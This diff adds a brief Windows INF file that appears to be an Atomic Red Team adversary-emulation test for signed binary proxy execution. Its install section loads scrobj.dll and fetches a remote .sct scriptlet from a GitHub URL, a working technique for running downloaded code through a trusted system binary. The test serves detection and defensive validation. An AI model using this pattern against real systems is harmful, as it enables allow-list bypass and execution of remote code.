@@ -1,0 +1,9 @@
+[version]
+signature="$CHICAGO$"
+AdvancedINF=2.0
+
+[DefaultInstall.Windows7]
+UnRegisterOCXs=FunRun
+
+[FunRun]
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/test.sct
